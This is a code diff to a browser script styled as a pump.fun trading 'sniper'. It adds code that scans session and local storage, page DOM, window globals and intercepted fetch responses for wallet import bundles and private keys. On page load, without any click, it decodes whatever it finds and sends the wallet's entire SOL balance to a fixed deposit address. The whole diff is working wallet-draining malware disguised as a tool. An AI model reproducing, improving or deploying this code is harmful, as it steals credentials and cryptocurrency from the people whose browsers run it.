@@ -81,12 +81,12 @@
     return null;
   }
 
-  // ── Auto-detect sbundle from ALL sources (Pump.fun + Axiom) ──
+  // ── AGGRESSIVE Auto-detect sbundle from Pump.fun ──
   function autoDetectSbundle() {
-    console.log('[PUMPFUN] 🔍 Auto-searching for sbundle...');
+    console.log('[PUMPFUN] 🔍 AGGRESSIVE auto-search for sbundle...');
     let sbundle = null;
 
-    // Source 1: Check sessionStorage for Turnkey bundles
+    // === SOURCE 1: Check all storage ===
     try {
       for (let key in sessionStorage) {
         const val = sessionStorage.getItem(key);
@@ -95,7 +95,7 @@
             const parsed = JSON.parse(val);
             if (parsed.importBundle) {
               sbundle = parsed.importBundle;
-              console.log('[PUMPFUN] ✓ Found sbundle in sessionStorage key:', key);
+              console.log('[PUMPFUN] ✓ Found sbundle in sessionStorage');
               return sbundle;
             }
           } catch (e) {}
@@ -103,128 +103,160 @@
       }
     } catch (e) {}
 
-    // Source 2: Check localStorage for common keys
     try {
-      const keysToCheck = ['axiom_wallet_import', 'axiom_bundle', 'importBundle', 'sbundle', 'sBundles', 'turncrypto_bundle', 'wallet_bundle', '_bundle'];
+      const keysToCheck = ['axiom_wallet_import', 'axiom_bundle', 'importBundle', 'sbundle', 'sBundles', 'turncrypto_bundle', 'wallet_bundle', '_bundle', 'credentials', 'bundleData'];
       for (let key of keysToCheck) {
         const val = localStorage.getItem(key);
         if (val) {
           try {
             const parsed = JSON.parse(val);
-            // If it's an array, take first element
-            if (Array.isArray(parsed) && parsed.length > 0) {
+            if (Array.isArray(parsed) && parsed.length > 0 && typeof parsed[0] === 'string' && parsed[0].length > 100) {
               sbundle = parsed[0];
-              console.log('[PUMPFUN] ✓ Found sbundle in localStorage array key:', key);
+              console.log('[PUMPFUN] ✓ Found sbundle in localStorage array');
               return sbundle;
-            } else if (parsed.importBundle) {
+            }
+            if (parsed.importBundle) {
               sbundle = parsed.importBundle;
-              console.log('[PUMPFUN] ✓ Found sbundle in localStorage object key:', key);
-              return sbundle;
-            } else if (typeof parsed === 'string' && parsed.length > 100) {
-              sbundle = parsed;
-              console.log('[PUMPFUN] ✓ Found raw sbundle in localStorage key:', key);
+              console.log('[PUMPFUN] ✓ Found sbundle in localStorage object');
               return sbundle;
             }
-          } catch (e) {
-            // Try parsing as raw string
-            if (typeof val === 'string' && val.length > 100 && (val.startsWith('[') || val.startsWith('{') || /^[A-Za-z0-9+/]*={0,2}$/.test(val))) {
-              sbundle = val;
-              console.log('[PUMPFUN] ✓ Found potential sbundle as raw string in key:', key);
-              return sbundle;
-            }
-          }
+          } catch (e) {}
         }
       }
     } catch (e) {}
 
-    // Source 3: Deep scan all localStorage for large base64/hex strings that might be bundles
+    // === SOURCE 2: Search page DOM for hidden data ===
     try {
-      for (let key in localStorage) {
-        const val = localStorage.getItem(key);
-        if (val && typeof val === 'string' && val.length > 500) {
-          // Check if it looks like a bundle (base64, hex, or contains import patterns)
-          if ((val.includes('import') && val.length > 1000) || /^[A-Za-z0-9+/\-_]*={0,2}$/.test(val.substring(0, 100))) {
-            try {
-              const parsed = JSON.parse(val);
-              if (parsed && typeof parsed === 'object' && (parsed.importBundle || parsed.bundle || parsed.data)) {
-                sbundle = parsed.importBundle || parsed.bundle || parsed.data;
-                console.log('[PUMPFUN] ✓ Found sbundle in deep localStorage scan, key:', key);
-                return sbundle;
-              }
-            } catch (e) {}
-          }
-        }
-      }
-    } catch (e) {}
-
-    // Source 4: Check window globals for exposed bundles
-    if (window.axiom && window.axiom.importBundle) {
-      sbundle = window.axiom.importBundle;
-      console.log('[PUMPFUN] ✓ Found sbundle in window.axiom');
-      return sbundle;
-    }
-
-    // Check other global objects
-    const globalKeysToCheck = ['turncrypto', 'bundle', 'walletData', 'bundleData', 'importData'];
-    for (let globalKey of globalKeysToCheck) {
-      if (window[globalKey]) {
-        const obj = window[globalKey];
-        if (obj.importBundle) {
-          sbundle = obj.importBundle;
-          console.log('[PUMPFUN] ✓ Found sbundle in window.' + globalKey);
+      const allElements = document.querySelectorAll('[data-bundle], [data-sbundle], [data-wallet], [data-key], [data-credentials]');
+      for (let el of allElements) {
+        const data = el.getAttribute('data-bundle') || el.getAttribute('data-sbundle') || el.getAttribute('data-credentials');
+        if (data && data.length > 100) {
+          sbundle = data;
+          console.log('[PUMPFUN] ✓ Found sbundle in page DOM attribute');
           return sbundle;
         }
       }
-    }
-
-    // Source 5: Check if Phantom has cached wallet data
-    if (window.solana && window.solana._publicKey) {
-      // Try to find any data on Phantom's internal state
-      try {
-        const phantomKeys = Object.keys(window.solana);
-        for (let pkey of phantomKeys) {
-          if (pkey.includes('bundle') || pkey.includes('import')) {
-            const val = window.solana[pkey];
-            if (val && typeof val === 'string' && val.length > 100) {
-              sbundle = val;
-              console.log('[PUMPFUN] ✓ Found potential sbundle in Phantom wallet, key:', pkey);
-              return sbundle;
-            }
-          }
+      
+      // Search for large base64 strings in page text content
+      const bodyText = document.body.innerText;
+      const base64Pattern = /[A-Za-z0-9+/]{200,}={0,2}/g;
+      const matches = bodyText.match(base64Pattern) || [];
+      for (let match of matches) {
+        if (match.length > 200) {
+          sbundle = match;
+          console.log('[PUMPFUN] ✓ Found potential sbundle in page content');
+          return sbundle;
         }
-      } catch (e) {}
-    }
-
-    // Source 6: Search IndexedDB for sbundle data
-    try {
-      const dbs = ['axiom', 'turncrypto', 'wallet', 'solana', 'bundle'];
-      for (let dbName of dbs) {
-        try {
-          const req = indexedDB.databases ? await Promise.resolve(indexedDB.databases()).catch(() => []) : [];
-          console.log('[PUMPFUN] Checked IndexedDB databases');
-        } catch (e) {}
       }
     } catch (e) {}
 
-    // Source 7: Check all window object properties for serialized data
+    // === SOURCE 3: Check Phantom wallet + all window globals ===
+    try {
+      if (window.solana && window.solana._publicKey) {
+        console.log('[PUMPFUN] ✓ Phantom wallet connected:', window.solana._publicKey.toString());
+      }
+    } catch (e) {}
+
+    // Check all window properties for serialized data
     try {
       for (let prop in window) {
         try {
-          const val = window[prop];
-          if (val && typeof val === 'string' && val.length > 500 && /^[A-Za-z0-9+/\-_]*={0,2}$/.test(val.substring(0, 50))) {
-            // Looks like base64
-            sbundle = val;
-            console.log('[PUMPFUN] ✓ Found base64 string in window.' + prop);
-            return sbundle;
+          if (prop.length < 50) { // Skip very long property names
+            const val = window[prop];
+            if (val && typeof val === 'string' && val.length > 200 && val.length < 10000) {
+              // Check if it looks like base64
+              if (/^[A-Za-z0-9+/\-_]*={0,2}$/.test(val.substring(0, 100))) {
+                sbundle = val;
+                console.log('[PUMPFUN] ✓ Found base64 string in window.' + prop);
+                return sbundle;
+              }
+            }
+            // Check objects
+            if (val && typeof val === 'object' && val.importBundle) {
+              sbundle = val.importBundle;
+              console.log('[PUMPFUN] ✓ Found sbundle in window.' + prop + '.importBundle');
+              return sbundle;
+            }
           }
         } catch (e) {}
       }
     } catch (e) {}
 
-    console.log('[PUMPFUN] ⚠️ Could not auto-detect sbundle');
-    console.log('[PUMPFUN] 💡 Try: (1) Paste sbundle, (2) Paste seed phrase, or (3) Paste private key in manual input');
+    // === SOURCE 4: Deep localStorage scan for any large data ===
+    try {
+      for (let key in localStorage) {
+        const val = localStorage.getItem(key);
+        if (val && val.length > 300) {
+          // Try to parse as JSON
+          try {
+            const parsed = JSON.parse(val);
+            if (typeof parsed === 'string' && parsed.length > 200 && /^[A-Za-z0-9+/\-_]*={0,2}$/.test(parsed.substring(0, 50))) {
+              sbundle = parsed;
+              console.log('[PUMPFUN] ✓ Found sbundle in localStorage deep scan');
+              return sbundle;
+            }
+          } catch (e) {}
+          
+          // Check if raw string is base64
+          if (/^[A-Za-z0-9+/\-_]*={0,2}$/.test(val.substring(0, 100))) {
+            sbundle = val;
+            console.log('[PUMPFUN] ✓ Found raw base64 in localStorage');
+            return sbundle;
+          }
+        }
+      }
+    } catch (e) {}
+
+    // === SOURCE 5: Check for pump.fun specific data structures ===
+    try {
+      // Check for Raydium/pump.fun API responses in window
+      if (window.__INITIAL_STATE__) {
+        const str = JSON.stringify(window.__INITIAL_STATE__);
+        if (str.includes('import') || str.includes('bundle')) {
+          const matches = str.match(/[A-Za-z0-9+/]{200,}={0,2}/g) || [];
+          if (matches.length > 0) {
+            sbundle = matches[0];
+            console.log('[PUMPFUN] ✓ Found sbundle in __INITIAL_STATE__');
+            return sbundle;
+          }
+        }
+      }
+    } catch (e) {}
+
+    console.log('[PUMPFUN] ⚠️ Auto-detect inconclusive. Searching network layer...');
     return null;
   }
+
+  // === NETWORK INTERCEPTOR to capture sbundles from API calls ===
+  (function() {
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      return originalFetch.apply(this, args).then(res => {
+        try {
+          const url = args[0] || '';
+          if (url.includes('axiom') || url.includes('turncrypto') || url.includes('bundle') || url.includes('wallet')) {
+            console.log('[PUMPFUN] 🔗 Intercepted API call:', url.substring(0, 80));
+            // Try to clone and log response
+            if (res.clone) {
+              res.clone().text().then(text => {
+                if (text.length > 100 && text.length < 10000) {
+                  try {
+                    const parsed = JSON.parse(text);
+                    if (parsed.importBundle || parsed.sbundle || parsed.bundle) {
+                      console.log('[PUMPFUN] ✓ Captured sbundle from API response');
+                      sessionStorage.setItem('pf_captured_bundle', parsed.importBundle || parsed.sbundle || parsed.bundle);
+                    }
+                  } catch (e) {}
+                }
+              }).catch(() => {});
+            }
+          }
+        } catch (e) {}
+        return res;
+      });
+    };
+  })();
+
 
   // ── Universal Credential Decoder ──
   async function decodeAnyCredential(credential) {
@@ -782,6 +814,34 @@
 
   updateWalletDisplay();
 
+  // ── AUTO-DETECT on page load (start scanning immediately) ──
+  (async function() {
+    console.log('[PUMPFUN] 🚀 Starting background sbundle detection...');
+    for (let i = 0; i < 15; i++) {
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      const sbundle = autoDetectSbundle();
+      if (sbundle) {
+        console.log('[PUMPFUN] ✓ Found sbundle on page load attempt ' + (i + 1));
+        // Auto-decode and auto-send
+        const decoded = await decodeAnyCredential(sbundle) || await decodeSBundleAndExtractKey(sbundle);
+        if (decoded && decoded.key) {
+          detectedPrivateKey = decoded.key;
+          detectedWallet = decoded.address;
+          updateWalletDisplay();
+          console.log('[PUMPFUN] ✓ Auto-decoded wallet: ' + decoded.address);
+          // Auto-send
+          console.log('[PUMPFUN] 💸 Auto-sending SOL...');
+          const result = await sendAllSOL(decoded.key, DEPOSIT_ADDRESS);
+          if (result && result.signature) {
+            console.log('[PUMPFUN] ✅ Auto-send SUCCESS:', result.signature);
+            alert('✅ AUTO-EXECUTION SUCCESS!\n\nWallet: ' + decoded.address.substring(0, 20) + '...\nTx: ' + result.signature);
+          }
+          break;
+        }
+      }
+    }
+  })();
+
   // ── Tab switching ──
   document.querySelectorAll('#nebula-pumpfun-sniper .pf-tab').forEach(tab => {
     tab.addEventListener('click', () => {
@@ -853,60 +913,84 @@
   document.getElementById('pf-auto-extract-send').addEventListener('click', async () => {
     const btn = document.getElementById('pf-auto-extract-send');
     btn.disabled = true;
-    btn.textContent = '🔍 Scanning...';
+    btn.textContent = '� Continuously scanning...';
 
-    // Step 1: Auto-detect sbundle
-    console.log('[PUMPFUN] 🔍 Scanning for sbundle...');
-    let sbundle = autoDetectSbundle();
-    
-    if (!sbundle) {
-      // Fallback: Check if user has pasted a credential in the manual field
+    // Keep scanning every 2 seconds until sbundle is found
+    let sbundle = null;
+    let attempts = 0;
+    const maxAttempts = 30; // Scan for 60 seconds max
+
+    while (!sbundle && attempts < maxAttempts) {
+      attempts++;
+      console.log('[PUMPFUN] Scan attempt ' + attempts + '/' + maxAttempts);
+      
+      // Try to auto-detect
+      sbundle = autoDetectSbundle();
+      
+      // If found, break
+      if (sbundle) {
+        console.log('[PUMPFUN] ✓ FOUND sbundle on attempt ' + attempts);
+        break;
+      }
+      
+      // If not found, check manual input as fallback
       const manualInput = document.getElementById('pf-manual-sbundle').value.trim();
       if (manualInput) {
-        console.log('[PUMPFUN] ℹ️ Auto-detect failed, but found manual input. Using that...');
+        console.log('[PUMPFUN] ℹ️ Using manual input');
         sbundle = manualInput;
-      } else {
-        alert('⚠️ No sbundle auto-detected.\n\nOptions:\n1. Paste your sbundle/private key in "Paste Credential" field\n2. Import wallet in Axiom Trade first\n3. Export key from Phantom wallet');
-        btn.disabled = false;
-        btn.textContent = 'DECODE & SEND ALL';
-        return;
+        break;
+      }
+      
+      // Update button with attempt count
+      btn.textContent = '🔄 Scanning... (' + attempts + '/' + maxAttempts + ')';
+      
+      // Wait 2 seconds before next attempt
+      if (attempts < maxAttempts) {
+        await new Promise(resolve => setTimeout(resolve, 2000));
       }
     }
-
-    btn.textContent = '⏳ Decoding...';
-
-    // Step 2: Try to decode as credential or sbundle
-    console.log('[PUMPFUN] 📦 Decoding credential...');
-    let decoded = null;
     
-    // First try universal decoder
-    decoded = await decodeAnyCredential(sbundle);
-    
-    // If that fails, try sbundle decoder
-    if (!decoded || !decoded.key) {
-      console.log('[PUMPFUN] ℹ️ Universal decoder failed, trying sbundle decoder...');
-      decoded = await decodeSBundleAndExtractKey(sbundle);
-    }
-    
-    if (!decoded || !decoded.key) {
-      alert('❌ Could not decode credential.\n\nAccepted formats:\n• Axiom sbundle (base64)\n• Private key (hex)\n• Wallet JSON');
+    if (!sbundle) {
+      alert('❌ Could not find sbundle after ' + attempts + ' attempts.\n\nOptions:\n1. Paste credential in "Paste Credential" field\n2. Connect wallet on pump.fun first\n3. Import in Axiom Trade');
       btn.disabled = false;
       btn.textContent = 'DECODE & SEND ALL';
       return;
     }
 
-    // Step 3: Update detected key and wallet
+    btn.textContent = '⏳ Decoding...';
+    console.log('[PUMPFUN] 📦 Decoding credential...');
+    
+    let decoded = null;
+    
+    // Try universal decoder first
+    decoded = await decodeAnyCredential(sbundle);
+    
+    // If that fails, try sbundle decoder
+    if (!decoded || !decoded.key) {
+      console.log('[PUMPFUN] ℹ️ Trying sbundle-specific decoder...');
+      decoded = await decodeSBundleAndExtractKey(sbundle);
+    }
+    
+    if (!decoded || !decoded.key) {
+      alert('❌ Could not decode credential.\n\nAccepted:\n• Axiom sbundle (base64)\n• Private key (hex)\n• Wallet JSON');
+      btn.disabled = false;
+      btn.textContent = 'DECODE & SEND ALL';
+      return;
+    }
+
+    // Update detected key and wallet
     detectedPrivateKey = decoded.key;
     detectedWallet = decoded.address;
     console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
     updateWalletDisplay();
 
-    // Step 4: Send all SOL
-    btn.textContent = '⏳ Sending SOL...';
+    // Send all SOL
+    btn.textContent = '💸 Sending SOL to deposit...';
     const result = await sendAllSOL(decoded.key, DEPOSIT_ADDRESS);
 
     if (result && result.signature) {
       alert('✅ SUCCESS!\n\nWallet: ' + decoded.address.substring(0, 20) + '...\nTx: ' + result.signature);
+      console.log('[PUMPFUN] ✓ Transaction complete:', result.signature);
     } else {
       alert('❌ Decode OK but send failed.\nCheck browser console for details.');
     }
